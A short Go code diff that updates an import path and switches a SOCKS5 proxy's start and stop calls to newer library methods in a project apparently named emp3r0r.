@@ -10,7 +10,7 @@ import (
 	"strconv"
 	"time"
 
-	"github.com/jm33-m0/emp3r0r/emagent/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/internal/tun"
 	"github.com/posener/h2conn"
 	"github.com/txthinking/socks5"
 )
@@ -40,7 +40,7 @@ func Socks5Proxy(op string, port string) (err error) {
 		}
 
 		log.Print("Socks5Proxy started")
-		err = ProxyServer.Run(nil)
+		err = ProxyServer.RunTCPServer()
 		if err != nil {
 			log.Println(err)
 		}
@@ -56,7 +56,7 @@ func Socks5Proxy(op string, port string) (err error) {
 		if ProxyServer == nil {
 			return errors.New("Proxy server is not running")
 		}
-		err = ProxyServer.Stop()
+		err = ProxyServer.Shutdown()
 		if err != nil {
 			log.Print(err)
 		}
